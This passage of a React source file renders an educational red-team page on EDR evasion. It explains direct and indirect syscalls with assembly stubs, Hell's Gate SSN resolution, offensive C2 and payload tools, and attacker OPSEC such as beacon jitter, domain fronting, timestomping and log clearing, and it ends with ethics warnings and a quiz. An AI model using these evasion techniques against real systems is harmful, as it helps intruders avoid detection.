                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: tech.color }}>{tech.name}</Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ lineHeight: 1.7 }}>{tech.desc}</Typography>
                  </Paper>
                </Grid>
              ))}
            </Grid>

            <Alert severity="info" sx={{ borderRadius: 2 }}>
              <AlertTitle sx={{ fontWeight: 700 }}>Defense in Depth Works Both Ways</AlertTitle>
              Just as defenders layer protections, attackers must layer evasions. Syscalls alone won't save you if
              your beacon's memory pattern is detected during sleep. Sleep masking won't help if ETW logs your injection.
              Combine multiple techniques for effective evasion.
            </Alert>
          </Paper>

          {/* Direct Syscalls Section */}
          <Paper id="syscalls" sx={{ p: 4, mb: 4, borderRadius: 4 }}>
            <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
              <SpeedIcon sx={{ color: accent }} />
              Direct & Indirect Syscalls
            </Typography>
            <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
              Direct syscalls bypass user-mode hooks entirely by invoking kernel functions directly. This is one of
              the most effective techniques for evading EDR instrumentation.
            </Typography>

            <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#22c55e" }}>
                Beginner's Guide: What is a Syscall?
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>The Problem:</strong><br/>
                Your program runs in "user mode" - a restricted environment where you can't directly access hardware,
                memory of other processes, etc. But your code often needs these capabilities (read files, create processes).<br/><br/>

                <strong>The Solution - Syscalls:</strong><br/>
                A syscall (system call) is how your user-mode code requests the kernel to do something privileged.
                It's like a controlled "escalator" from user mode to kernel mode and back.<br/><br/>

                <strong>Analogy - The VIP Entrance:</strong><br/>
                Imagine a nightclub (kernel). Normal people (user-mode apps) can't just walk in. You need to go through
                the bouncer (Windows API). The bouncer checks your ID (validates parameters), then lets you in through
                the official entrance. A syscall is like finding the VIP back door - you skip the bouncer entirely!
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#3b82f6", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#3b82f6", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#3b82f6" }}>
                How Windows API Calls Actually Work
              </Typography>
              <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#000", 0.3), fontFamily: "monospace", mb: 2 }}>
                <Typography variant="body2" component="pre" sx={{ whiteSpace: "pre-wrap", lineHeight: 1.6, color: "#f8f8f2" }}>
{`NORMAL API CALL - What happens when you call WriteProcessMemory():

YOUR CODE
    ↓ calls WriteProcessMemory(hProcess, address, data, size)
    
kernel32.dll (C:\\Windows\\System32\\kernel32.dll)
    ↓ High-level wrapper, does some parameter validation
    ↓ calls NtWriteVirtualMemory()
    
ntdll.dll (C:\\Windows\\System32\\ntdll.dll)
    ↓ The "lowest" user-mode layer
    ↓ Sets up registers with syscall number + parameters
    ↓ Executes: syscall instruction
    
─────────────── RING 3 → RING 0 TRANSITION ───────────────

KERNEL (ntoskrnl.exe)
    ↓ Receives syscall, looks up handler by syscall number
    ↓ Executes actual memory write operation
    ↓ Returns result back to user mode

═══════════════════════════════════════════════════════════

WITH EDR HOOKING - Where they intercept you:

YOUR CODE
    ↓
kernel32.dll
    ↓ [EDR might hook here too]
ntdll.dll
    ↓ FIRST BYTES REPLACED: jmp EDR_Code
    
EDR_Code (in their DLL)
    ↓ Logs: "Process X called NtWriteVirtualMemory"
    ↓ Checks: Is target process suspicious? Is data shellcode?
    ↓ Decision: Allow? Block? Alert?
    ↓ If allowed, jumps back to original ntdll code
    ↓
ntdll.dll (continues)
    ↓ syscall
    ↓
KERNEL`}
                </Typography>
              </Paper>
              <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
                <strong>The Key Insight:</strong> EDR hooks are in USER MODE (ntdll.dll). If we execute the syscall
                instruction ourselves, we skip their hooks entirely! This is why direct syscalls are so powerful.
              </Typography>
            </Box>

            <Grid container spacing={3} sx={{ mb: 3 }}>
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#dc2626", 0.08), border: `1px solid ${alpha("#dc2626", 0.2)}`, height: "100%" }}>
                  <Typography variant="h6" sx={{ fontWeight: 700, color: "#dc2626", mb: 2 }}>Direct Syscalls</Typography>
                  <Typography variant="body2" component="div" sx={{ lineHeight: 1.8, mb: 2 }}>
                    Execute the syscall instruction directly in your code:
                  </Typography>
                  <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#000", 0.3), fontFamily: "monospace", mb: 2 }}>
                    <Typography variant="body2" component="pre" sx={{ whiteSpace: "pre-wrap", lineHeight: 1.4, color: "#f8f8f2", fontSize: "0.75rem" }}>
{`; x64 direct syscall stub
mov r10, rcx           ; Windows ABI quirk
mov eax, 0x3F          ; SSN for NtAllocateVirtualMemory
syscall                ; Transition to kernel!
ret`}
                    </Typography>
                  </Paper>
                  <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
                    <strong>Pros:</strong> Bypasses all user-mode hooks completely<br/>
                    <strong>Cons:</strong> Syscall instruction not coming from ntdll.dll is suspicious. EDRs can detect this via kernel callbacks.
                  </Typography>
                </Paper>
              </Grid>
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#3b82f6", 0.08), border: `1px solid ${alpha("#3b82f6", 0.2)}`, height: "100%" }}>
                  <Typography variant="h6" sx={{ fontWeight: 700, color: "#3b82f6", mb: 2 }}>Indirect Syscalls</Typography>
                  <Typography variant="body2" component="div" sx={{ lineHeight: 1.8, mb: 2 }}>
                    Jump to the syscall instruction inside ntdll.dll:
                  </Typography>
                  <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#000", 0.3), fontFamily: "monospace", mb: 2 }}>
                    <Typography variant="body2" component="pre" sx={{ whiteSpace: "pre-wrap", lineHeight: 1.4, color: "#f8f8f2", fontSize: "0.75rem" }}>
{`; Indirect: Jump PAST the hook
mov r10, rcx
mov eax, 0x3F          ; SSN
jmp [syscall_addr]     ; Jump to syscall
                       ; inside ntdll.dll!`}
                    </Typography>
                  </Paper>
                  <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
                    <strong>Pros:</strong> Syscall appears to originate from ntdll.dll (legitimate location)<br/>
                    <strong>Cons:</strong> More complex - must find syscall instruction address in ntdll
                  </Typography>
                </Paper>
              </Grid>
            </Grid>

            <Box sx={{ bgcolor: alpha("#f59e0b", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#f59e0b" }}>
                Syscall Number (SSN) Resolution
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                The biggest challenge: syscall numbers change between Windows versions!<br/><br/>

                <strong>Example - NtAllocateVirtualMemory SSN:</strong><br/>
                • Windows 7 SP1: 0x15<br/>
                • Windows 10 1809: 0x18<br/>
                • Windows 10 21H2: 0x18<br/>
                • Windows 11: 0x18<br/><br/>

                <strong>Solution Techniques:</strong>
              </Typography>
              <Grid container spacing={2} sx={{ mt: 1 }}>
                {[
                  { name: "SysWhispers", desc: "Compile-time resolution - generates header files with syscall stubs for target Windows versions" },
                  { name: "Hell's Gate", desc: "Runtime resolution - reads SSN from ntdll.dll function prologue at runtime" },
                  { name: "Halo's Gate", desc: "Handles hooked functions - if target function is hooked, reads SSN from nearby unhooked function" },
                  { name: "Tartarus Gate", desc: "Advanced - walks syscall table to find SSNs even when EDR modifies function prologues" },
                ].map((tech) => (
                  <Grid item xs={12} md={6} key={tech.name}>
                    <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#f59e0b", 0.08) }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b" }}>{tech.name}</Typography>
                      <Typography variant="caption" color="text.secondary">{tech.desc}</Typography>
                    </Paper>
                  </Grid>
                ))}
              </Grid>
            </Box>

            <Box sx={{ bgcolor: alpha("#8b5cf6", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#8b5cf6" }}>
                Hell's Gate - Reading SSN from ntdll.dll
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9, mb: 2 }}>
                If the function isn't hooked, its syscall number is right there in the code:
              </Typography>
              <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#000", 0.3), fontFamily: "monospace", mb: 2 }}>
                <Typography variant="body2" component="pre" sx={{ whiteSpace: "pre-wrap", lineHeight: 1.6, color: "#f8f8f2" }}>
{`; Normal NtAllocateVirtualMemory in ntdll.dll looks like:
4C 8B D1              ; mov r10, rcx
B8 18 00 00 00        ; mov eax, 0x18  ← THIS IS THE SSN!
0F 05                 ; syscall
C3                    ; ret

; Hell's Gate technique:
; 1. Get address of function in ntdll.dll
; 2. Check bytes: if [addr] == 0x4C && [addr+1] == 0x8B...
; 3. SSN = *(DWORD*)(addr + 4)  // Read 0x18 from encoded instruction

; If hooked, first bytes will be: jmp [EDR_address]
; E9 XX XX XX XX      ; jmp relative
; Hell's Gate fails here → use Halo's Gate instead`}
                </Typography>
              </Paper>
            </Box>

            <Alert severity="info" sx={{ borderRadius: 2 }}>
              <AlertTitle sx={{ fontWeight: 700 }}>EDR Counter-Measures</AlertTitle>
              Modern EDRs know about syscalls. Some counters: kernel callbacks to monitor syscall returns, stack frame
              analysis (syscall should return through ntdll), and timing analysis. Syscalls alone aren't a silver bullet—
              combine with other techniques for effective evasion.
            </Alert>
          </Paper>

          {/* Tools Section */}
          <Paper id="tools" sx={{ p: 4, mb: 4, borderRadius: 4 }}>
            <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
              <BuildIcon sx={{ color: accent }} />
              Tools & Frameworks
            </Typography>

            <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#22c55e" }}>
                Beginner's Guide: Choosing Your Tools
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>Don't reinvent the wheel!</strong> The payload development community has created excellent tools.
                But understanding HOW they work is more valuable than just using them.<br/><br/>

                <strong>Learning Path:</strong><br/>
                1. <strong>Start with msfvenom:</strong> Learn basic payload generation and encoding concepts<br/>
                2. <strong>Move to Sliver/Havoc:</strong> Free C2s with modern evasion - understand what they do<br/>
                3. <strong>Study SysWhispers:</strong> Read the code, understand syscalls at the low level<br/>
                4. <strong>Progress to Cobalt Strike:</strong> Industry standard once you understand the fundamentals<br/>
                5. <strong>Build your own:</strong> Now you can create custom tools based on your knowledge!<br/><br/>

                <strong>Tool vs Understanding:</strong><br/>
                Using ScareCrow to evade EDRs is great. But if it gets detected, can you modify it?
                Understanding the techniques means you can adapt when tools fail.
              </Typography>
            </Box>

            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Payload Generation & Evasion Frameworks</Typography>
            <Grid container spacing={2} sx={{ mb: 3 }}>
              {[
                { name: "Cobalt Strike", desc: "Commercial red team platform with Malleable C2 profiles, Beacon Object Files (BOFs), and extensive customization options. Industry standard for professional engagements.", type: "Commercial", color: "#dc2626" },
                { name: "msfvenom", desc: "Metasploit's payload generator. Great for learning - supports many formats (exe, dll, shellcode) and basic encoders (shikata_ga_nai, etc.). Usually needs additional obfuscation.", type: "Open Source", color: "#3b82f6" },
                { name: "Donut", desc: "Converts .NET assemblies, EXEs, and DLLs into position-independent shellcode. Essential for 'execute-assembly' style attacks. Very actively developed.", type: "Open Source", color: "#8b5cf6" },
                { name: "ScareCrow", desc: "Generates payloads designed to evade EDRs. Uses techniques like DLL side-loading, signed binary abuse, and code signing. Actively maintained.", type: "Open Source", color: "#22c55e" },
                { name: "Sliver", desc: "Modern C2 framework by BishopFox. Free alternative to Cobalt Strike with mTLS, HTTP(S), DNS, and WireGuard comms. Built-in evasion and cross-platform implants.", type: "Open Source", color: "#f59e0b" },
                { name: "Havoc", desc: "Advanced C2 framework with sophisticated evasion (sleep masking, syscalls). Supports BOFs and has a clean UI. Rapidly evolving.", type: "Open Source", color: "#ec4899" },
              ].map((tool) => (
                <Grid item xs={12} md={6} key={tool.name}>
                  <Paper sx={{ p: 2.5, borderRadius: 2, bgcolor: alpha(tool.color, 0.08), border: `1px solid ${alpha(tool.color, 0.15)}`, height: "100%" }}>
                    <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
                      <Typography variant="subtitle1" sx={{ fontWeight: 700, color: tool.color }}>{tool.name}</Typography>
                      <Chip label={tool.type} size="small" variant="outlined" sx={{ borderColor: tool.color, color: tool.color }} />
                    </Box>
                    <Typography variant="body2" color="text.secondary" sx={{ lineHeight: 1.7 }}>{tool.desc}</Typography>
                  </Paper>
                </Grid>
              ))}
            </Grid>

            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Syscall & Evasion Libraries</Typography>
            <Grid container spacing={2} sx={{ mb: 3 }}>
              {[
                { name: "SysWhispers / SysWhispers2 / SysWhispers3", desc: "Generates direct syscall stubs for C/C++. v1 used static SSNs, v2 added egg-hunter, v3 uses indirect syscalls. Essential learning resource.", color: "#dc2626" },
                { name: "Hell's Gate / Halo's Gate / Tartarus Gate", desc: "Dynamic SSN resolution techniques that read syscall numbers at runtime. Halo's Gate handles hooked functions. Study these papers!", color: "#f59e0b" },
                { name: "D/Invoke", desc: ".NET dynamic invocation library. Lets you call Windows APIs without static imports. Essential for C# payload development.", color: "#3b82f6" },
                { name: "SharpSploit", desc: "C# post-exploitation library. Collection of techniques in managed code. Great for learning .NET tradecraft.", color: "#8b5cf6" },
              ].map((tool) => (
                <Grid item xs={12} md={6} key={tool.name}>
                  <Paper sx={{ p: 2.5, borderRadius: 2, bgcolor: alpha(tool.color, 0.08), border: `1px solid ${alpha(tool.color, 0.15)}` }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: tool.color }}>{tool.name}</Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ lineHeight: 1.7 }}>{tool.desc}</Typography>
                  </Paper>
                </Grid>
              ))}
            </Grid>

            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Analysis & Testing Tools</Typography>
            <Grid container spacing={2}>
              {[
                { name: "x64dbg / WinDbg", desc: "Debuggers for analyzing how payloads work and troubleshooting. Essential for understanding low-level execution.", color: "#22c55e" },
                { name: "PE-bear / CFF Explorer", desc: "PE file analyzers. Understand executable structure, imports, sections. Useful for loader development.", color: "#3b82f6" },
                { name: "DefenderCheck / ThreatCheck", desc: "Identify which bytes in your payload trigger Windows Defender. Invaluable for signature evasion.", color: "#dc2626" },
                { name: "Process Hacker / API Monitor", desc: "Monitor API calls and process behavior. See exactly what your payload does at runtime.", color: "#f59e0b" },
              ].map((tool) => (
                <Grid item xs={12} md={6} key={tool.name}>
                  <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha(tool.color, 0.05), border: `1px solid ${alpha(tool.color, 0.1)}` }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: tool.color }}>{tool.name}</Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ lineHeight: 1.7 }}>{tool.desc}</Typography>
                  </Paper>
                </Grid>
              ))}
            </Grid>
          </Paper>

          {/* OPSEC Section */}
          <Paper id="opsec" sx={{ p: 4, mb: 4, borderRadius: 4 }}>
            <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
              <EngineeringIcon sx={{ color: accent }} />
              Operational Security (OPSEC)
            </Typography>

            <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#22c55e" }}>
                Beginner's Guide: What is OPSEC?
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>OPSEC = Operational Security</strong> = Don't get caught!<br/><br/>

                <strong>The Attacker's Dilemma:</strong><br/>
                You need to interact with the target to accomplish your mission. But every interaction leaves traces.
                OPSEC is about minimizing and managing those traces.<br/><br/>

                <strong>Think of it like a burglar:</strong><br/>
                • <strong>Bad burglar:</strong> Breaks window loudly, leaves fingerprints, drops wallet, takes selfie<br/>
                • <strong>Good burglar:</strong> Picks lock quietly, wears gloves, takes only target items, no traces<br/><br/>

                <strong>Digital traces include:</strong><br/>
                • Network traffic patterns (beaconing behavior)<br/>
                • File system artifacts (dropped files, timestamps)<br/>
                • Log entries (event logs, application logs)<br/>
                • Memory forensics (strings, handles, injected code)<br/>
                • Behavioral patterns (time-of-day activity, command sequences)
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#dc2626", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#dc2626", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#dc2626" }}>
                Common OPSEC Failures (Don't Do These!)
              </Typography>
              <Grid container spacing={2}>
                {[
                  { mistake: "Uploading to VirusTotal", why: "All AV vendors get your sample. Your technique is now signatured. Intelligence agencies also monitor VT." },
                  { mistake: "Using default tool signatures", why: "Cobalt Strike's default profile is heavily signatured. Same with msfvenom defaults. Customize EVERYTHING." },
                  { mistake: "Testing on target without lab work", why: "Your test triggers detection, burns your access, alerts defenders. Test in isolated lab first!" },
                  { mistake: "Reusing infrastructure", why: "That IP/domain you used last engagement? It's now on threat intel feeds. Fresh infrastructure every time." },
                  { mistake: "Excessive beaconing", why: "Beaconing every 5 seconds? Easy to detect. Every 4 hours with jitter? Much stealthier." },
                  { mistake: "Ignoring timestamps", why: "Your payload compiled at 3am in your timezone? Your C2 cert created last week? Forensics will notice." },
                ].map((item, idx) => (
                  <Grid item xs={12} md={6} key={idx}>
                    <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#dc2626", 0.05) }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#dc2626", mb: 0.5 }}>{item.mistake}</Typography>
                      <Typography variant="body2" color="text.secondary" sx={{ lineHeight: 1.6 }}>{item.why}</Typography>
                    </Paper>
                  </Grid>
                ))}
              </Grid>
            </Box>

            <Box sx={{ bgcolor: alpha("#3b82f6", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#3b82f6", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#3b82f6" }}>
                OPSEC Best Practices
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>Infrastructure:</strong><br/>
                • Use redirectors (don't expose real C2)<br/>
                • Categorized domains (domain fronting, CDNs)<br/>
                • Valid SSL certificates (Let's Encrypt, not self-signed)<br/>
                • Age your domains (defenders check domain age)<br/><br/>

                <strong>Traffic:</strong><br/>
                • Blend with normal traffic (HTTPS on 443, DNS on 53)<br/>
                • Use legitimate User-Agents that match target environment<br/>
                • Jitter your beacon intervals (±50% randomization)<br/>
                • Consider working hours (beacon during business hours only)<br/><br/>

                <strong>Payload:</strong><br/>
                • Customize all strings, certificates, watermarks<br/>
                • Strip debug symbols and metadata<br/>
                • Match compile timestamps to cover<br/>
                • Test against target's exact security stack in lab<br/><br/>

                <strong>Cleanup:</strong><br/>
                • Plan your exit before entry<br/>
                • Remove persistence, delete artifacts<br/>
                • Timestomp files if necessary<br/>
                • Clear relevant logs (if in scope)
              </Typography>
            </Box>

            <Alert severity="info" sx={{ borderRadius: 2 }}>
              <AlertTitle sx={{ fontWeight: 700 }}>OPSEC is a Mindset</AlertTitle>
              Think about every action: What trace does this leave? Can it be correlated with other traces?
              Would a defender notice this? Paranoia is appropriate here.
            </Alert>
          </Paper>

          {/* Ethics Section */}
          <Paper id="ethics" sx={{ p: 4, mb: 4, borderRadius: 4 }}>
            <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
              <GavelIcon sx={{ color: accent }} />
              Ethics & Legal Considerations
            </Typography>

            <Alert severity="error" sx={{ borderRadius: 2, mb: 3 }}>
              <AlertTitle sx={{ fontWeight: 700 }}>Critical Legal Warning</AlertTitle>
              Creating, distributing, or using malicious payloads without authorization is a serious crime. Laws include
              the Computer Fraud and Abuse Act (CFAA) in the US, Computer Misuse Act (CMA) in the UK, and similar
              legislation worldwide. Penalties include years in federal prison and massive fines. "I was just learning"
              is NOT a legal defense.
            </Alert>

            <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#22c55e" }}>
                The Line Between Legal and Illegal
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>✅ LEGAL (with proper authorization):</strong><br/>
                • Penetration testing with signed Rules of Engagement (RoE)<br/>
                • Red team exercises with explicit written permission<br/>
                • Research in isolated lab environments you own<br/>
                • Bug bounty programs within defined scope<br/>
                • Educational exercises on your own systems<br/><br/>

                <strong>❌ ILLEGAL:</strong><br/>
                • Accessing ANY system without explicit authorization<br/>
                • "Testing" your skills on random websites/companies<br/>
                • Creating payloads for others who lack authorization<br/>
                • Exceeding the scope of your authorization<br/>
                • Accessing data you weren't authorized to see (even during legal pen test)<br/><br/>

                <strong>The Test:</strong> Can you show a written document signed by someone with authority
                that explicitly permits your specific actions on these specific systems? If not, don't do it.
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#3b82f6", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#3b82f6", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#3b82f6" }}>
                Professional Ethics for Red Teamers
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>Before Engagement:</strong><br/>
                • Get WRITTEN authorization (Rules of Engagement document)<br/>
                • Clarify scope: what systems, what techniques, what hours<br/>
                • Establish communication channels with client POC<br/>
                • Define "crown jewels" - what data proves access without exfiltrating real secrets<br/>
                • Set up deconfliction process (so defenders don't waste time on your activity)<br/><br/>

                <strong>During Engagement:</strong><br/>
                • Stay within scope - even if you find a juicy target outside scope, don't touch it<br/>
                • Don't cause unnecessary damage or disruption<br/>
                • If you find actual malicious activity, stop and report immediately<br/>
                • Protect any data you access - treat it as confidential<br/>
                • Document everything for your report<br/><br/>

                <strong>After Engagement:</strong><br/>
                • Remove all persistence and access<br/>
                • Securely delete any collected data<br/>
                • Write honest, actionable report<br/>
                • Never use client-specific techniques or findings elsewhere<br/>
                • Protect client confidentiality forever
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#f59e0b", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#f59e0b" }}>
                Building Your Career Ethically
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>Where to Practice Legally:</strong><br/>
                • <strong>Your own lab:</strong> Virtual machines, home network - 100% legal<br/>
                • <strong>CTF platforms:</strong> HackTheBox, TryHackMe, OverTheWire - designed for practice<br/>
                • <strong>Bug bounties:</strong> HackerOne, Bugcrowd - authorized testing with rewards<br/>
                • <strong>Open source projects:</strong> Contribute to security tools legitimately<br/><br/>

                <strong>Certifications that matter:</strong><br/>
                • OSCP (Offensive Security) - Hands-on pen testing<br/>
                • CRTO (Zero-Point Security) - Red team operations<br/>
                • GPEN/GWAPT (SANS) - Industry recognized<br/><br/>

                <strong>The Community:</strong><br/>
                • Contribute to open source tools<br/>
                • Write blog posts sharing (responsibly disclosed) research<br/>
                • Help others learn in ethical ways<br/>
                • Report vulnerabilities responsibly when found
              </Typography>
            </Box>

            <Alert severity="warning" sx={{ borderRadius: 2 }}>
              <AlertTitle sx={{ fontWeight: 700 }}>Remember: With Great Power...</AlertTitle>
              The skills you learn here can cause real harm to real people. Companies lose money, employees lose jobs,
              people's private data gets exposed. Use these skills only to make systems MORE secure, not less.
              The security community is small - your reputation matters.
            </Alert>
          </Paper>

          {/* Quiz Section */}
          <Paper id="quiz-section" sx={{ p: 4, mb: 4, borderRadius: 4 }}>
            <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
              <QuizIcon sx={{ color: accent }} />
              Knowledge Check
            </Typography>
            <QuizSection questions={questionBank} questionsPerQuiz={10} accentColor={accent} />
          </Paper>

          <Divider sx={{ my: 4 }} />

          <Box sx={{ display: "flex", justifyContent: "center" }}>
            <Button
              variant="contained"
              startIcon={<ArrowBackIcon />}
              onClick={() => navigate("/learn")}
              sx={{ bgcolor: accent, "&:hover": { bgcolor: accentDark }, px: 4, py: 1.5, fontWeight: 700 }}
            >
              Back to Learning Hub
            </Button>
          </Box>
        </Box>
      </Box>
    </LearnPageLayout>
  );
}
